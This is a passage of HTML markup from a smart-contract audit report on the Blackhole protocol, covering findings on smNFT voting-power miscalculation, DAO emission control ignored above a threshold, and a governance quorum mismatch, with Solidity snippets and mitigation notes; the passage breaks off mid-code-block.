snippet above that if specific token is not smNFT \u003cstrong\u003eRIGHT NOW\u003c/strong\u003e (as locked mapping stores current state of \u003ccode\u003etokenId\u003c/code\u003e); it skips its voting power in the calculation. However,  the function \u003cstrong\u003eDOES NOT\u003c/strong\u003e take into the consideration that specific \u003ccode\u003etokenId\u003c/code\u003e can be smNFT right now, but could be permanent/not permanent NFT at \u003ccode\u003etimestamp - timestamp\u003c/code\u003e. This means that if some NFTs at \u003ccode\u003etimestamp X\u003c/code\u003e was not-permanent locked position, now it’s smNFT (it is possible inside the VotingEscrow to update NFTs to smNFTs), the voting power from the \u003ccode\u003etimestamp X\u003c/code\u003e will be added to the \u003ccode\u003evotes\u003c/code\u003e variable calculation which is incorrect as at this point in time X, the nft WAS NOT smNFT.\u003c/p\u003e\n\u003cp\u003eThe biggest impact here is that \u003ccode\u003eBlackGovernor\u003c/code\u003e contract uses the \u003ccode\u003egetsmNFTPastVotes\u003c/code\u003e to determine the voting power of the account at some point in time (and the calculation is incorrect). This leads to some users having calculated bigger voting power than they should have leading to for example proposals being proposed from users who SHOULD NOT have that ability or votes casted using bigger power than actual.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eWhen calculating check whether at \u003ccode\u003etimestamp\u003c/code\u003e NFT was actually smNFT.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-64\"\u003emaxvzuvex\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-55\"\u003erayss\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-21-governance-emission-adjustment-ignored-when-weekly-emission-above-tail-threshold\" style=\"position:relative;\"\u003e\u003ca href=\"#m-21-governance-emission-adjustment-ignored-when-weekly-emission-above-tail-threshold\" aria-label=\"m 21 governance emission adjustment ignored when weekly emission above tail threshold permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-270\"\u003e[M-21] Governance emission adjustment ignored when weekly emission above tail threshold\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-82\"\u003evesko210\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-482\"\u003ecodexNature\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-424\"\u003ehakunamatata\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/MinterUpgradeable.sol#L169-#L180\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/MinterUpgradeable.sol#L169-#L180\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"summary-1\" style=\"position:relative;\"\u003e\u003ca href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSummary\u003c/h3\u003e\n\u003cp\u003eThe protocol only applies the DAO-controlled \u003ccode\u003etailEmissionRate\u003c/code\u003e when the weekly emission drops below \u003ccode\u003eTAIL_START\u003c/code\u003e. This prevents governance from influencing emissions during the intended phase (epoch ≥ 67), which contradicts the documented behavior and severely limits DAO control.\u003c/p\u003e\n\u003ch3 id=\"finding-description-11\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-11\" aria-label=\"finding description 11 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding Description\u003c/h3\u003e\n\u003cp\u003eIn the current implementation of \u003ccode\u003eupdate_period()\u003c/code\u003e, the weekly emission is multiplied by \u003ccode\u003etailEmissionRate\u003c/code\u003e \u003cstrong\u003eonly when\u003c/strong\u003e \u003ccode\u003e_weekly \u0026#x3C; TAIL_START\u003c/code\u003e. This logic is meant to apply the DAO’s voted emission adjustment in the governance-controlled phase (from epoch 67 onwards). However, this condition prevents DAO influence if emissions remain above \u003ccode\u003eTAIL_START\u003c/code\u003e, effectively locking the emission rate even after governance takes over.\u003c/p\u003e\n\u003cp\u003eThis violates the protocol’s documented guarantee:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e“On and after the 67th epoch, it relies on the Governance DAO. If the DAO votes in favor, it increases by 1% of the previous epoch’s emission; if the proposal is against, emission will decrease by 1%; else it will remain the same.”\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eBecause the DAO’s control is blocked when \u003ccode\u003e_weekly \u003e= TAIL_START\u003c/code\u003e, the contract fails to fulfill its core governance mechanism — undermining decentralization, community control, and emission responsiveness.\u003c/p\u003e\n\u003ch3 id=\"impact-12\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-12\" aria-label=\"impact 12 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eThe impact is \u003cstrong\u003eHigh\u003c/strong\u003e. The protocol enters a governance phase after epoch 66, but the DAO’s vote is ignored unless emissions are below a fixed threshold. This means DAO proposals may appear to pass, but have no effect - creating a false sense of control. It limits emission modulation, disrupts monetary policy, and could erode community trust.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eRemove the \u003ccode\u003eif (_weekly \u0026#x3C; TAIL_START)\u003c/code\u003e conditional and apply \u003ccode\u003etailEmissionRate\u003c/code\u003e unconditionally when \u003ccode\u003eepochCount \u003e= 67\u003c/code\u003e, as per the documentation.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWEEK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_initializer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWEEK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWEEK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eactive_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_weekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_emission\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Phase 1: Epochs 1–14 (inclusive) — 3% growth\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e15\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_weekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_weekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWEEKLY_GROWTH\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMAX_BPS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Phase 2: Epochs 15–66 (inclusive) — 1% growth\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e67\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_weekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_weekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMAX_BPS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Phase 3: Epochs 67+ — DAO governance control via nudge()\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Apply governance-controlled tailEmissionRate from prior vote\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Note: tailEmissionRate will have been set via `nudge()`\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_weekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_weekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etailEmissionRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMAX_BPS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis allows the DAO to truly control emissions starting at epoch 67, as promised in the docs.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-45\"\u003erayss\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-22-governance-deadlock-potential-in-blackgovernorsol-due-to-quorum-mismatch\" style=\"position:relative;\"\u003e\u003ca href=\"#m-22-governance-deadlock-potential-in-blackgovernorsol-due-to-quorum-mismatch\" aria-label=\"m 22 governance deadlock potential in blackgovernorsol due to quorum mismatch permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-57\"\u003e[M-22] Governance deadlock potential in \u003ccode\u003eBlackGovernor.sol\u003c/code\u003e due to quorum mismatch\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-52\"\u003espectr\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/BlackGovernor.sol#L52\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/BlackGovernor.sol#L52\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/BlackGovernor.sol#L91\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/BlackGovernor.sol#L91\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-12\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-12\" aria-label=\"finding description 12 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eSeverity\u003c/strong\u003e: Medium\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAffected contracts\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003econtracts/BlackGovernor.sol\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003econtracts/VotingEscrow.sol\u003c/code\u003e (as the source of \u003ccode\u003egetPastTotalSupply\u003c/code\u003e and \u003ccode\u003esmNFTBalance\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003econtracts/MinterUpgradeable.sol\u003c/code\u003e (as the target of the \u003ccode\u003enudge()\u003c/code\u003e function)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe mechanism for proposals in \u003ccode\u003eBlackGovernor.sol\u003c/code\u003e has a fundamental mismatch between how the \u003ccode\u003eproposalThreshold\u003c/code\u003e is determined and how the \u003ccode\u003equorum\u003c/code\u003e is calculated.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eProposal Threshold\u003c/strong\u003e: Determined by \u003ccode\u003eproposalThreshold()\u003c/code\u003e, which requires a percentage (default 0.2%, configurable by \u003ccode\u003eteam\u003c/code\u003e up to 10%) of the \u003cem\u003etotal current \u003ccode\u003eveBLACK\u003c/code\u003e voting power\u003c/em\u003e. This includes voting power from both regular \u003ccode\u003eveNFT\u003c/code\u003e locks and Supermassive NFTs (smNFTs).\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// contracts/BlackGovernor.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eproposalThreshold\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPastTotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalNumerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePROPOSAL_DENOMINATOR\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan 